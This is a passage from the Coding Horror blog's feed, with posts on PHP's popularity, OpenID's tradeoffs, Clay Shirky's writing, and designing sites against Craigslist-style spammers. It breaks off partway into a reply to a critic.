<p>The <a href="http://www.tiobe.com/index.php/content/paperinfo/tpci/index.html">TIOBE community index</a> I linked above? It's written in PHP. Wikipedia, which is likely to be on the first page of anything you search for these days? <a href="http://en.wikipedia.org/wiki/MediaWiki">Written in PHP</a>. Digg, the social bookmarking service so wildly popular that a front page link can crush the beefiest of webservers? <a href="http://www.oreillynet.com/onlamp/blog/2006/04/digg_phps_scalability_and_perf.html">Written in PHP</a>. WordPress, arguably the most popular blogging solution available at the moment? <a href="http://en.wikipedia.org/wiki/WordPress">Written in PHP</a>. YouTube, the most widely known video sharing site on the internet? <a href="http://www.procata.com/blog/archives/2006/11/09/why-is-php-code-considered-hard-to-maintain/">Written in PHP</a>. Facebook, the current billion-dollar zombie-poking social networking darling of venture capitalists everywhere? <a href="http://blog.facebook.com/blog.php?post=2356432130">Written in PHP</a>. (<span style="color: red;">Update:</span> While YouTube was originally written in PHP, it migrated to Python fairly early on, per Matt Cutts and Guido van Rossum.)</p>
<p>Notice a pattern here?</p>
<p>Some of the largest sites on the internet – sites you probably interact with on a daily basis – are written in PHP. If PHP sucks so profoundly, <em>why is it powering so much of the internet?</em></p>
<p>The only conclusion I can draw is that <strong>building a compelling application is far more important than choice of language.</strong> While PHP wouldn't be my choice, and if pressed, I might argue that it should <em>never</em> be the choice for any rational human being sitting in front of a computer, I can't argue with the results.</p>
<p>You've probably heard that <a href="http://www.codinghorror.com/blog/archives/000272.html">sufficiently incompetent coders can write FORTRAN in any language</a>. It's true. But the converse is also true: <strong>sufficiently talented coders can write great applications in terrible languages</strong>, too. It's a painful lesson, but an important one.</p>
<p>Why fight it? I say learn to embrace it. Join with me, won't you, in celebrating the next fifty years of glorious PHP code driving the internet. Just don't forget to call the <code>maintain_my_will_to_live()</code> PHP function every so often!</p>
<!--kg-card-end: markdown-->
             ]]></content>
<pubDate>2008-05-20T12:00:00.000Z</pubDate>
<guid>https://blog.codinghorror.com/php-sucks-but-it-doesnt-matter/</guid>
<author><![CDATA[ Jeff Atwood ]]></author>
</item>
<item>
<title><![CDATA[ OpenID: Does The World Really Need Yet Another Username and Password? ]]></title>
<link>https://blog.codinghorror.com/openid-does-the-world-really-need-yet-another-username-and-password/</link>
<content><![CDATA[ 
                <!--kg-card-begin: markdown--><p>
As we continue to work on the code that will eventually become stackoverflow, we belatedly realized that <b>we'd be contributing to the glut of username and passwords on the web</b>. I have fifty online logins, and <a href="http://www.codinghorror.com/blog/archives/000546.html">I can't remember any of them!</a> Adding that fifty-first set of stackoverflow.com credentials is unlikely to help matters.
</p>
<p>
With some urging from my friend <a href="http://weblogs.asp.net/jgalloway/">Jon Galloway</a>, I decided to take a look at <a href="http://en.wikipedia.org/wiki/OpenID">OpenID</a>. OpenID aims to <a href="http://openid.net/what/">solve the login explosion problem</a>:
</p>
<p>
</p>
<blockquote>
OpenID eliminates the need for multiple usernames across different websites, simplifying your online experience.
<p>
You get to choose the OpenID Provider that best meets your needs and most importantly that you trust. At the same time, your OpenID can stay with you, no matter which Provider you move to. And best of all, the OpenID technology is not proprietary and is completely free.
</p>
</blockquote>
<p>
In the spirit of <a href="http://www.codinghorror.com/blog/archives/000346.html">Show, Don't Tell</a>, here's how it works:
</p>
<p>
Let's say you're visiting a new website for the first time. As you browse around, eventually you'll do something that requires more than anonymous guest access. So you'll get shunted to the "create a new account" page, in whatever form that takes. I'm sure everyone reading this knows the drill. But if the website is OpenID enabled, you <i>don't</i> have to go through all the typical rigamarole necessary to create a new account. Instead, you can <b>enter your OpenID login</b>:
</p>
<p>
<img alt="image placeholder" >
</p>
<p>
I'm going to indulge in a bit of hand waving here and assume that you already have an OpenID login. It's not such a terrible stretch, honestly; every AOL and Yahoo user already has an OpenID login even if they don't know it yet.
</p>
<p>
OpenIDs are technically URLs. Here are a few examples:
</p>
<p>
</p>
<ul>
<li>http://claimid.com/<font color="red">yourname</font>
</li>
<li>http://<font color="red">yourname</font>.signon.com
</li>
<li>https://me.yahoo.com/<font color="red">yourname</font>
</li>
</ul>
<p>
That's one usability problem with OpenID: you have to remember a relatively complete personal URL that no two OpenID providers define the same way. Which compares unfavorably to, say, remembering your email address. There are shortcuts around this that I'll describe later, but for now, there's <a href="https://www.idselector.com/">ID selector</a>, which provides a reasonably friendly UI for building an OpenID login URL.
</p>
<p>
<img alt="image placeholder" >
</p>
<p>
If you enter the right URL, you'll get redirected back to your OpenID provider, where you'll enter your single set of login credentials.
</p>
<p>
<img alt="image placeholder" >
</p>
<p>
You'll be prompted to add this site to your provider's list of "trusted sites" for your account. Once you do this, you can bypass all of these steps the next time you're on the site.
</p>
<p>
<img alt="image placeholder" >
</p>
<p>
And, finally, you're logged in for the first time!
</p>
<p>
<img alt="image placeholder" >
</p>
<p>
If that seems like extra work -- and remember, I'm not counting the time it took to set up the initial account at ClaimID, either -- well, I won't lie to you. It is more work. But it's worth noting that:
</p>
<p>
</p>
<ol>
<li>The cost of account creation at your OpenID provider can eventually be <b>amortized across dozens of sites which will all accept those same credentials</b>.
<p></p>
</li>
<li>After the first OpenID login at a particular site, assuming you've added that site to your trust list, <b>subsequent logins are literally one-click operations</b>.
</li>
</ol>
<p>
It's not exactly frictionless, but it's a heck of an improvement over having to remember 50 different usernames and passwords for 50 different websites, wouldn't you say? I think it compares quite favorably with the current champion of frictionless communication: anonymous comment boxes. They typically have three fields to fill out: username, URL, and email. OpenID requires only <i>one</i>. Your provider can proxy your URL and email back to the blog automatically from your provider profile, if you choose a smart provider with <a href="http://blogs.gnome.org/jamesh/2007/11/26/openid-ax/">attribute exchange</a> support.
</p>
<p>
Which brings me to the other problem with OpenID. <b>The quality of your OpenID experience is heavily influenced by the provider you choose</b>. For example, Yahoo! is smart enough to work even if you enter nothing but "yahoo.com" as your OpenID URL. That is, assuming you've enabled OpenID support for your Yahoo! login. Providers can also offer unique functionality that sets them apart, too. For example, <a href="https://www.signon.com/">SignOn.com</a> allows the use of <a href="https://www.signon.com/help#icards">Information Cards in Windows</a>, so you can log into a website without ever typing in a password! It's a bit of work, as you have to associate the Information Card with your provider account first, but I tried it, and it works as advertised.
</p>
<p>
My experiments with OpenID were quite positive, but all is not wine and roses in the land of OpenID. Stefan Brands identifies <a href="http://idcorner.org/2007/08/22/the-problems-with-openid/">some potentially large problems with OpenID</a>, backed by exhaustive references:
</p>
<p>
</p>
<ol>
<li>
<b>Phishing</b>. A malicious site could visit the OpenID provider URL you gave it, screen-scrape your login form, and present it locally, intercepting your login and password. However, if you choose a quality OpenID provider, they'll use SSL and a high-grade certificate so you'll have some confidence you're not being fooled. Yahoo also offers <a href="http://security.yahoo.com/article.html?aid=2006102507">anti-phishing image watermarks</a> for OpenID logins, as well.
<p></p>
</li>
<li>
<b>Privacy</b>. Your OpenID provider will know, by definition, every site you log into using its credentials. So I hope you trust your provider.
<p></p>
</li>
<li>
<b>Centralized Risk</b>. If your OpenID account is compromised, every site you used to access it is also compromised. I'm not sure how much riskier this is than having your email credentials compromised, as many (most?) sites allow you to send a password reset to your email address.
<p></p>
</li>
<li>
<b>Lack of Trust</b>. The OpenID providers provide no identity checking whatsoever. It's sort of like those generic "identity cards" you can obtain online, which are pretty useless next to, say, your Driver's License, which was issued by a local governmental authority. What if Fake Steve Jobs created a fake OpenID purporting to be Steve Jobs, or a fake OpenID provider?
<p></p>
</li>
<li>
<b>Additional Complexity</b>. Your login now involves two completely different entities: the website you're attempting to gain access to, <i>and</i> your OpenID provider. You have to understand this new relationship to troubleshoot any problems with your login -- and the OpenID provider has to be up and running for you to log in at all.
<p></p>
</li>
<li>
<b>Adoption Inequality</b>. It's easy for AOL, Yahoo!, Six Apart, and Technorati to become OpenID <i>providers</i> -- but what good does that do you when there are very few OpenID <i>consumers</i>? As Dare points out, there are <a href="http://www.25hoursaday.com/weblog/2007/08/13/AProposalForSocialNetworkInteroperabilityViaOpenID.aspx">no financial incentives to accept credentials from your competitors</a>, but there are certainly plenty of incentives for driving account creation on your own site. For now, I expect OpenID to be driven primarily by small applications and sites that don't have millions of dollars of skin in the game.
</li>
</ol>
<p>
As I mentioned above, I feel most of these criticisms can be mitigated by picking a quality, trustworthy OpenID Provider. Particularly one that uses SSL. Since it's an open ecosystem, I'd hope the more reputable and reliable OpenID providers would rise to the top. And consider the advantages: as an application developer, you <b>no longer have to store passwords!</b> That's a <i>huge</i> advantage, because <a href="http://www.codinghorror.com/blog/archives/000953.html">storing passwords is the last business you want to be in</a>. Trust me on this one.
</p>
<p>
I also found Jan Miksovsky's <a href="http://miksovsky.blogs.com/flowstate/2007/08/openid-great-id.html">criticisms of the user experience of OpenID</a> -- as of 6 months ago -- fairly damning:
</p>
<p>
</p>
<blockquote>
And all this is for -- what, exactly? To save me from having to pick a user name and password? As annoying as that can be, it's just not that hard! Remembering an arbitrary user name does cause real trouble, but simply allowing email addresses to be used as IDs can solve almost all of that problem. As more and more sites allow email addresses as IDs, the need for OpenID becomes less compelling to a consumer.
<p>
For the time being, I can't imagine a sane business operator forcing their precious visitors through this gauntlet of user experience issues just for the marginal benefits that accrue to a shared form of ID. I've read numerous claims that all it will take is for someone big like Google to support OpenID to crack this problem open. Unfortunately, there's no business of any size that can afford to direct their traffic down a dead end.
</p>
<p>
Most service operators will, at best, offer users a choice between using a proprietary ID or an OpenID, creating a terrible economic proposition for a consumer. Faced with the proposition of: 1) struggling once for thirty minutes to struggle through a process they can barely understand, or 2) spending two minutes on every new site breezing through a familiar process they've done countless times before, <b>normal busy people will choose the familiar route time and time again.</b> I'll bet anything that most people will keep going for proprietary IDs, further deferring the network effects possible from OpenID adoption.
</p>
</blockquote>
<p>
Perhaps the most compelling point Jan makes is this one: it <i>is</i> a bit odd to ask users to associate themselves with an arbitrary URL instead of an email address. I definitely saw some rough edges in today's experimentation, but I'd say the user experience has improved since Jan looked at OpenID. That's encouraging.
</p>
<p>
I realize that OpenID is far from an ideal solution. But right now, the one-login-per-website problem is so bad that I am willing to accept these tradeoffs for a partial <a href="http://www.codinghorror.com/blog/archives/001046.html">worse is better</a> solution. There's absolutely no way I'd put my banking credentials behind an OpenID. But there are also dozens of sites that I don't need anything remotely approaching banking-grade security for, and I use these sites far more often than my bank. The collective pain of remembering all these logins -- and the way my email inbox becomes a de-facto collecting point and security gateway for all of them -- is substantial.
</p>
<p>
If you're a software developer building an application that requires user accounts, please consider using OpenID rather than polluting the world with yet another login and password. I also encourage you to <a href="http://openid.net/">experiment with OpenID</a> as a user. Create one. Try logging in somewhere with one. If you don't like the experience, or if you agree with one (or more) of the criticisms I listed above, <b>how can we collectively fix it?</b> We desperately need a solution to the login explosion, and right now the only thing I've seen on the horizon that has any kind of critical mass whatsoever is OpenID.
</p>
<p>
If we can't <b>make OpenID work, at least for run of the mill, low-value credentials that litter the web in increasing numbers</b> -- what hope do we have of ever fixing the login explosion problem?
</p>
<p>
</p>
<p></p>
<!--kg-card-end: markdown-->
             ]]></content>
<pubDate>2008-05-22T12:00:00.000Z</pubDate>
<guid>https://blog.codinghorror.com/openid-does-the-world-really-need-yet-another-username-and-password/</guid>
<author><![CDATA[ Jeff Atwood ]]></author>
</item>
<item>
<title><![CDATA[ It's Clay Shirky's Internet, We Just Live In It ]]></title>
<link>https://blog.codinghorror.com/its-clay-shirkys-internet-we-just-live-in-it/</link>
<content><![CDATA[ 
                <!--kg-card-begin: markdown--><p>
I can't remember when, exactly, I discovered <a href="http://www.shirky.com/">Clay Shirky</a>, but I suspect it was around 2003 or so. I sent him an email about micropayments, he actually answered it, and we had a rather nice discussion on the topic. I've been a fan of Clay's writing ever since. (In case you're curious, Clay was right -- micropayments are dead -- and I was <a href="http://www.codinghorror.com/blog/archives/000772.html">dead wrong</a>. All the more reason to be a fan.)
</p>
<p>
<b>I don't think you'll find a smarter, more articulate writer on the topic of internet community than Clay Shirky</b>. His <a href="http://www.codinghorror.com/blog/archives/000295.html">A Group Is Its Own Worst Enemy</a>, for example, is <i>the</i> seminal article on the folly of addressing social software problems purely through technology. I've <a href="http://www.google.com/search?q=site%3Acodinghorror.com+%22clay+shirky%22">referenced Clay a number of times on this blog</a>, and his writing seems more and more prescient with each passing year. It's Clay Shirky's Internet; <a href="http://itre.cis.upenn.edu/~myl/languagelog/archives/002947.html">we just live in it</a>.
</p>
<p>
<a href="http://www.shirky.com/herecomeseverybody/2008/04/looking-for-the-mouse.html">Gin, Television, and Social Surplus</a> is a more recent example:
</p>
<p>
</p>
<blockquote>
Did you ever see that episode of Gilligan's Island where they almost get off the island and then Gilligan messes up and then they don't? I saw that one. I saw that one a lot when I was growing up. And every half-hour that I watched that was a half an hour I wasn't posting at my blog or editing Wikipedia or contributing to a mailing list. Now I had an ironclad excuse for not doing those things, which is none of those things existed then. I was forced into the channel of media the way it was because it was the only option. Now it's not, and that's the big surprise. However lousy it is to sit in your basement and pretend to be an elf, I can tell you from personal experience it's worse to sit in your basement and try to figure if Ginger or Mary Ann is cuter.
<p>
And I'm willing to raise that to a general principle. It's better to do something than to do nothing. Even lolcats, even cute pictures of kittens made even cuter with the addition of cute captions, hold out an invitation to participation. When you see a lolcat, one of the things it says to the viewer is, "If you have some sans-serif fonts on your computer, you can play this game, too." And that message -- <i>I can do that, too</i> -- is a big change.
</p>
<p>
This is something that people in the media world don't understand. Media in the 20th century was run as a single race -- consumption. How much can we produce? How much can you consume? Can we produce more and you'll consume more? And the answer to that question has generally been yes. But media is actually a triathlon, it 's three different events. People like to consume, but they also like to produce, and they like to share.
</p>
</blockquote>
<p>
It's exactly this sort of deep, penetrating insight which <b>makes me wonder if Clay Shirky will be looked back on as one of the key historical figures of the nascent internet era</b>. Maybe I'm just a naive fanboy, but the guy seems to see a lot farther than everyone else. So you can imagine the great interest I had in Clay's new book, <a href="http://www.amazon.com/exec/obidos/ASIN/1594201536/codihorr-20">Here Comes Everybody: The Power of Organizing Without Organizations</a>.
</p>
<p>
<a href="http://www.amazon.com/exec/obidos/ASIN/1594201536/codihorr-20"><img alt="image placeholder" >
</p>
<p>
(I'm showing the UK version of the book cover because it's about a zillion times better than the US cover. Seriously, what were they thinking?)
</p>
<p>
After reading <a href="http://www.amazon.com/exec/obidos/ASIN/1594201536/codihorr-20">Here Comes Everybody</a>, I'm happy to report that it does not disappoint. I'd even go so far as to say <b>if you're developing social software of any kind, this book should be required reading</b>. I feel so strongly about this, in fact, that I just gave my copy to my stackoverflow coding partner. And I <i>will</i> be following up with pop quizzes. What's that, you say? You don't develop social software? <a href="http://www.jwz.org/doc/groupware.html">Are you sure?</a>
</p>
<p>
</p>
<blockquote>
So I said, narrow the focus. Your "use case" should be, there's a 22 year old college student living in the dorms. <a href="http://www.codinghorror.com/blog/archives/000579.html">How will this software get him laid?</a>
<p>
That got me a look like I had just sprouted a third head, but bear with me, because I think that it's not only crude but insightful. "How will this software get my users laid" should be on the minds of anyone writing social software (and these days, almost all software is social software).
</p>
<p>
"Social software" is about making it easy for people to do other things that make them happy: meeting, communicating, and hooking up.
</p>
</blockquote>
<p>
As Jamie Zawinski once said, <b>these days, almost all software <i>is</i> social software</b>.
</p>
<p>
If you're not able to devote the time to the book, I encourage you to at least check out <a href="http://www.youtube.com/watch?v=A_0FgRKsqqU">Clay's 42 minute presentation on "Here Comes Everybody"</a> from earlier this year.
</p>
<p>
<object height="355" width="425"><param name="movie" value="http://www.youtube.com/v/A_0FgRKsqqU&amp;hl=en&amp;rel=0">
<param name="wmode" value="transparent">
<embed height="355" src="http://www.youtube.com/v/A_0FgRKsqqU&amp;hl=en&amp;rel=0" type="application/x-shockwave-flash" width="425" wmode="transparent"></embed></object>
</p>
<p>
I found the introduction particularly inspiring; I've transcribed it here.
</p>
<p>
</p>
<blockquote>
I've been writing principally for an audience of programmers and engineers and techies and so forth for about a dozen years. I wanted to write this book for a general audience, because the effects of the internet are now becoming broadly social enough that there is a general awareness that the internet isn't a decoration on contemporary society, but a challenge to it. A society that has an internet is a different kind of society, in the same way that a society that has a printing press was a different kind of society. <b>We're living through the largest increase in human expressive capability in history.</b>
<p>
It's a big claim. There are really only four revolutions that could compete for that:
</p>
<p>
</p>
<ol>
<li>The printing press and movable type considered as one broad period of innovation.
</li>
<li>Telegraph and telephone considered as one broad period of innovation.
</li>
<li>Recorded media of all types, first images, then sound, then moving images, then moving images with sound.
</li>
<li>Finally, the ability to harness broadcast.
</li>
</ol>
<p>
These are the media revolutions that existed as part of the landscape prior to our historical generation. There is a curious asymmetry to them, which is the ones that create groups don't create two-way communication, and the ones that create two-way communications don't create groups. Either you had something like a magazine or television, where the broadcast was from the center to the edge, but the relationship was between producer and consumer. Or you had something like the telephone, where people could engage in a two-way conversation, but the medium didn't create any kind of group.
</p>
<p>
And then there's now. What we've got is a network that is natively good at group forming. In fact, this isn't just a fifth revolution. It holds the contents of the previous revolutions, which is to say we can now distribute music and movies and conversations all in this medium. But the other thing it does is move us into a world of two-way groups. Thirty years from now, when I'm presenting this book, if I had to describe it in one bullet point -- this is what the bullet point would say:
</p>
<p>
Group Action Just Got Easier.
</p>
<p>
This is, in the context of change in our historical generation, the big deal. This isn't just a new way of broadcasting information, it isn't just a new way of having two way communication, it actually engages groups. <b>In this medium, freedom of speech, freedom of the press, and freedom of assembly are all now the same freedom.</b> And the spread of that capability is the big deal.
</p>
</blockquote>
<p>
Now, it could be that blogging and working on stackoverflow is clouding my perspective, making these social software issues unusually relevant to my work. When I <a href="http://www.codinghorror.com/blog/archives/001020.html">wrote</a>:
</p>
<p>
</p>
<blockquote>
I realized, that's it. That's it exactly. That is what is so intensely satisfying about writing here. My happiness only becomes real when I share it with all of you.
</blockquote>
<p>
I didn't realize the serendipitous parallels between that sentiment and Clay's claim that <a href="http://www.shirky.com/herecomeseverybody/2008/02/supernova-talk-the-internet-runs-on-love.html">the internet runs on love</a>:
</p>
<p>
</p>
<blockquote>
In the past, we could do little things for love, but big things, big things required money. Now, we can do big things for love.
</blockquote>
<p>
I have no idea if stackoverflow will be a "big thing" or not. But it sure is nice to wake up in the morning and work on building a community of people who love computers and code as much as I do.
</p>
<p>
<a href="http://www.codinghorror.com/blog/archives/000212.html"><img alt="image placeholder" >
</p>
<p>
Or maybe I'm just a hopeless romantic.
</p>
<p>
</p>
<p></p>
<!--kg-card-end: markdown-->
             ]]></content>
<pubDate>2008-05-26T12:00:00.000Z</pubDate>
<guid>https://blog.codinghorror.com/its-clay-shirkys-internet-we-just-live-in-it/</guid>
<author><![CDATA[ Jeff Atwood ]]></author>
</item>
<item>
<title><![CDATA[ Designing For Evil ]]></title>
<link>https://blog.codinghorror.com/designing-for-evil/</link>
<content><![CDATA[ 
                <!--kg-card-begin: markdown--><p>Have you ever used <a href="http://en.wikipedia.org/wiki/Craigslist">Craigslist</a>? It's an almost entirely free, mostly anonymous <a href="http://en.wikipedia.org/wiki/Classified_advertising">classified advertising</a> service which evolved from an early internet phenomenon into a service so powerful it is often <a href="http://www.sfweekly.com/2005-11-30/news/craig-list-com/">accused of single-handedly destroying the newspaper business</a>. Unfortunately, these same characteristics also make Craigslist a particularly juicy target for spammers and evildoers. Who knows; maybe it's karma.</p>
<p>I consider Craiglist a generally benevolent public service. Perhaps that's why I was so disturbed by <a href="http://www.sitetruth.com/">John Nagle's</a> wartime narrative of the <a href="http://techdirt.com/articles/20080523/0327151211.shtml">raging battle between Craigslist and spammers</a>.</p>
<blockquote>
<p>Spam on Craigslist has been a minor nuisance for years. Not any more. <b>This year, the spammers started winning and are taking over Craigslist.</b> Here's how they did it. Craigslist tries to stop spamming by:</p>
<ul>
<li>Checking for duplicate submissions.</li>
<li>Blocking excessive posts from a single IP address.</li>
<li>Requiring users to register with a valid email address.</li>
<li>Using a CAPTCHA to stop automated posting tools.</li>
<li>Letting users flag postings they recognize as spam.</li>
</ul>
<p>Several commercial products are now available to overcome those little obstacles to bulk posting. <a href="http://www.adsoncraigs.com/" rel="nofollow">CL Auto Posting Tool</a> is one such product. It not only posts to Craigslist automatically, it has built-in strategies to overcome each Craigslist anti-spam mechanism:</p>
<ul>
<li>Random text is added to each spam message to fool Craigslist's duplicate message detector.</li>
<li>IP proxy sites are used to post from a wide range of IP addresses.</li>
<li>E-mail addresses for reply are Gmail accounts conveniently created by Jiffy Gmail Creator (ed. note: this does <i>not</i> break Google's CAPTCHA, as you can <a href="https://blog.codinghorror.com/content/images/2015/08/jiffy_gmail_email_creator-81763-2.jpeg">see in this screenshot</a>.)</li>
<li>An OCR system reads the obscured text in the CAPTCHA.</li>
<li>Automatic monitoring detects when a posting has been flagged as spam and reposts it.</li>
</ul>
<p>CL Auto Poster isn't the only such tool. Other desktop software products are AdBomber and Ad Master. For spammers preferring a service-oriented approach, there's ItsYourPost. With these power tools, the defenses of Craigslist have been overrun. <b>Some categories on Craigslist have become over 90% spam.</b> The personals sections were the first to go, then the services categories, and more recently, the job postings.</p>
<p>Craigslist is fighting back. Its latest gimmick is phone verification. Posting in some categories now requires a callback phone call, with a password sent to the user either by voice or as an SMS message. Only one account is allowed per phone number. Spammers reacted by using VoIP numbers. Craigslist blocked those. Spammers tried using number-portability services like Grand Central and Tossable Digits. Craigslist blocked those. Spammers tried using their own free ringtone sites to get many users to accept the Craigslist verification call, then type in the password from the voice message. Craigslist hasn't countered that trick yet.</p>
<p>Much of the back and forth battle can be <a href="https://news.ycombinator.com/item?id=247724">followed in various forums</a>. It's not clear yet who will win.</p>
</blockquote>
<p>I've used Craigslist quite a few times in the past, mostly to sell things that are too unwieldy to ship, with generally positive results. But that's the "for sale" section, and the spammers seem to be concentrating on the personals and services. I was curious about this, so I delved into <a href="http://sfbay.craigslist.org/w4m/">the local personals section</a> in what I guessed to be the most popular category. (Note to my wife: this is <i>research!</i> Research! I <i>swear!</i>)</p>
<p>Almost immediately I found a personals ad with the following "image":</p>
<img alt="image placeholder" >
<p>It's an encoded wartime transmission from someone battling Craigslist spammers. It ends on this dire warning:</p>
<p><span style="color:red">99.9% of the ads these days are fakes. Sad but true. REALLY, ALMOST ALL THE ADS ARE FAKE!</span></p>
<p>But is it true? I saw some obvious spam in the personals section – all of which had been flagged for removal by the time I clicked on it – but certainly nothing to corroborate this 99.9% claim. I did a few unique term searches on random personals (my favorite at the moment is "no murderers please!"), and they came up unique.</p>
<p>Clearly, there's a war on, and there have been casualties on both sides. Even if the spammers aren't winning, every inch they gain <b>further undermines the community's trust in Craigslist and devalues everyone's participation</b>.</p>
<p>This is a topic I am acutely interested in as we build stackoverflow.com out. Like Craigslist, <a href="http://stackoverflow.com">Stack Overflow</a> will offer a rich experience for anonymous internet users. We will not require you to create an account or "login" to answer or ask questions. We'll even track your reputation and preferred settings for you, as long as you allow us to store a standard browser cookie. While it's true that we'll initially be a low-value target due to limited traffic and a specialized audience, that will inevitably change over time. So you can expect some of the same measures on Stack Overflow (and, later, <a href="http://www.discourse.org">Discourse</a>) that Craigslist and Wikipedia use to <b>mitigate anonymous evil</b>:</p>
<ul>
<li>Some form of CAPTCHA.</li>
<li>The ability to temporarily "lock" controversial questions so only registered users can edit or add responses.</li>
<li>An automatic throttle if we see rapid, bot-like actions from your IP address.</li>
<li>Some basic heuristics to detect "spammy" content, such as too many URLs, or typing inhumanly fast.</li>
<li>An easy way for users with sufficient reputation to undo vandalism by reverting to an earlier version.</li>
</ul>
<p>The community itself can also assist. Every question and answer on Stack Overflow can be rated Digg style; if a given bit of content rapidly accrues a large number of downmods, it is likely to be spam or inappropriate content, and will be automatically removed or directed into a moderation queue.</p>
<p>Don't get me wrong. I've been humbled by the quality – and the sheer size – of the community that has grown up around this blog. I expect the overwhelming majority of people who participate in Stack Overflow will be upstanding Internet citizens. <b>Wikipedia is a living testament to the fact that goodness vastly outnumbers evil.</b> We good guys <i>can</i> win, if we have the forethought to put some controls in place first.</p>
<p>Allowing anonymous users to post creates a volatile situation where a dozen sufficiently motivated spammers can easily poison the well for <i>thousands</i> of typical users. These spammers don't give a damn about the community we're building together. All they care about is getting paid by posting their links anywhere and everywhere they can. They'll run roughshod over as many websites and pages as possible in their frantic, abusive pursuit of money. If I didn't so desperately want to choke the life out of each and every one of them, I might actually feel sorry for the poor bastards.</p>
<p>But here's the problem: following the rules and being a good citizen is easy. Being evil is hard; it takes more work. Sometimes a lot more work. <b>The bad guys get <i>paid</i> to learn about their exploits.</b> Are you willing to educate yourself about the complex evil that a tiny minority of powerful users are prepared to unleash upon your site?</p>
<p>As with so many things in life, this is best illustrated by a scene from <a href="http://www.imdb.com/title/tt0094012/">Spaceballs</a>:</p>
<p><video poster="/content/images/2015/08/because-good-is-dumb-poster.jpg" width="100%" preload="none" controls><source src="http://discourse-cdn.codinghorror.com/uploads/default/original/3X/4/1/41d09c5b74c5d10aaae52037fea9fe66f02fd035.mp4"></source></video></p>
<p><strong>So, Lone Starr, now you see that evil will always triumph, <em>because good is dumb</em>.</strong></p>
<p>As the good guys, we can't afford to be ignorant of the spammers' techniques. If that means spelunking through the grimiest corners of some <a href="http://www.blackhatworld.com/blackhat-seo/f1-black-hat-forum/" rel="nofollow">scummy black hat forums</a>, then so be it. I'll tell you this: I've never <a href="http://en.wikipedia.org/wiki/Nofollow">nofollowed</a> a single link on this blog until today. The most effective way to fight the evil spammers is to understand them, and the first step toward understanding evil is openly linking to their tools and methods, exposing them to as much public scrutiny as possible.</p>
<p>When you design your software, <strong>work under the assumption that some of your users will be evil</strong>: out to game the system, to defeat it at every turn, to cause interruption and denial of service, to attack and humiliate other users, to fill your site with the vilest, nastiest spam you can possibly imagine. If you <i>don't</i> do that, you'll end up with something like <a href="http://blog.codinghorror.com/the-day-the-trackbacks-died/">blog trackbacks, which are irreparably busted at this point</a>. Trackbacks are the source of countless untold hours of institutionalized spam pain and suffering, all because the initial designers apparently did not ask themselves one simple question: what if some of our users are evil?</p>
<p>Because when good is dumb, evil will always triumph.</p>
<p>Websites that allow users to post content will always be vulnerable to the actions of a handful of evil, spammy users. It's not pleasant. It is a dark mirror into the ugly underbelly of human nature. But it's also an unfortunate, unavoidable fact of life. And <b>when you fail to design for evil, you have failed your community.</b></p>
<!--kg-card-end: markdown-->
             ]]></content>
<pubDate>2008-05-28T12:00:00.000Z</pubDate>
<guid>https://blog.codinghorror.com/designing-for-evil/</guid>
<author><![CDATA[ Jeff Atwood ]]></author>
</item>
<item>
<title><![CDATA[ Strong Opinions, Weakly Held ]]></title>
<link>https://blog.codinghorror.com/strong-opinions-weakly-held/</link>
<content><![CDATA[ 
                <!--kg-card-begin: markdown--><p>I seldom pause to answer criticism of my blog. If I did, I'd have time for little else in the course of the day, and no time for constructive work. But occasionally I'll encounter a particularly well written critique that gives me pause, such as Alastair Rankine's <a href="http://girtby.net/archives/2008/05/22/blogging-horror/">Blogging Horror</a>. Since I feel that Alastair wrote it out of genuine good will, and that his criticisms are sincerely set forth, I want to try to answer his statement in what I hope will be patient and reasonable terms.</p>
<blockquote>
<p>However, Coding Horror has become so popular that Atwood has quit his day job and struck out on his own. To my mind, this raises the bar somewhat. Professional bloggers deserve more scrutiny than dabblers, just as in many other fields.</p>
<p>Not only has Atwood has gone pro with his blog, but has recently started a venture called stackoverflow to collate accepted wisdom from the software development community. It is early days, but from what I can gather there is still likely to be Atwood's editorial hand in the output, despite intentions of adopting community generated content.</p>
<p>In other words, <b>Atwood seems to be setting himself up as an authority figure on software development</b> and, well, I have some issues with this.</p>
</blockquote>
<p>I'd like to first answer this with two slides from my <a href="http://blog.codinghorror.com/see-you-at-cusec-2008/">January CUSEC presentation</a>, presented here verbatim with no modifications.</p>
<img alt="image placeholder" >
<img alt="image placeholder" >
<p>Authority in our field is a strange thing. Perceived authority is stranger still.</p>
<p>I've always thought of myself as nothing more than a <b>rank amateur seeking enlightenment.</b> This blog is my attempt to <a href="http://www.codinghorror.com/blog/archives/001020.html">invite others along for the journey</a>. It has become a rather popular journey along the way, which has subtly altered the nature of the journey and the way I approach it, but the goal remains the same.</p>
<p>It troubles me greatly to hear that people see me as an expert or an authority, and not <a href="http://www.longnow.org/views/essays/articles/ArtFeynman.php">a fellow amateur</a>:</p>
<blockquote>
<p>When I got back to Boston I went to the library and discovered a book by Kimura on the subject, and much to my disappointment, all of our "discoveries" were covered in the first few pages. When I called back and told Richard what I had found, he was elated. "Hey, we got it right!" he said. "Not bad for amateurs."</p>
<p>In retrospect I realize that in almost everything that we worked on together, we were both amateurs. In digital physics, neural networks, even parallel computing, we never really knew what we were doing. But the things that we studied were so new that no one else knew exactly what they were doing either. It was amateurs who made the progress.</p>
</blockquote>
<p>These people are industry giants, so any comparison between them and myself is accidental. It's the overall point they're making that I want to call your attention to: <a href="http://blog.codinghorror.com/fifty-years-of-software-development/">software is an incredibly young discipline</a>. Everything in software is so new and so frequently being reinvented that <b>almost nobody really knows what they are doing. It is amateurs who make all the progress.</b></p>
<p>When it comes to software development, if you profess expertise, if you pitch yourself as an authority, you're either lying to us, or lying to yourself. In our heart of hearts, we know: the real progress is made by the amateurs. They're so busy <i>living</i> software they don't usually have time to pontificate at length about the breadth of their legendary expertise. If I've learned anything in my career, it is that approaching software development as an expert, as someone who has already discovered everything there is to know about a given topic, is the one surest way to fail.</p>
<p>Experts are, if anything, more suspect than the amateurs, because they're less honest. Regardless, you absolutely <i>should</i> question everything I write here, in the same way you question everything you've ever read online -- or anywhere else for that matter. Your own research and data should trump any claims you read from <i>anyone</i>, no matter how much of an authority or expert you, I, Google, or the general community at large may believe them to be.</p>
<p>But if, as Alastair correctly points out, I now derive a significant part of my income from blogging, doesn't that make me a professional blogger by definition? I thought Dave Winer had a great <a href="http://www.scripting.com/stories/2008/05/19/nothingFromNothingLeavesNo.html#p3">explanation</a> that I'll gladly co-opt:</p>
<blockquote>
